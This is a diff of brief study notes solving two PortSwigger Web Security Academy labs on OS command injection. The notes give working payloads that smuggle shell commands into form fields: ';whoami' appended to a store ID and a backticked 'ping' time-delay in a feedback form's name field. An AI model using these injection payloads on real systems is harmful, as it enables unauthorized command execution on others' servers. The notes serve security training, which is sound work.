@@ -1,8 +1,12 @@
-[lab: OS command injection, simple case]
+[lab: OS command injection, simple case] 
 url: https://portswigger.net/web-security/os-command-injection/lab-simple
 solution:
     step-1: open repeater
     step-2: productId=1&storeId=1;whoami
 
     response: peter-CS24tR
+
+[lab: Blind OS command injection with time delays]
+url: https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays
+solution: csrf=BnYgQDa9dPFIsVm5XDq89aGkABCMww1k&name=help`ping -c 10 127.0.0.1 ` &email=a%40haha.com&subject=hahaha&message=hahahahah
 
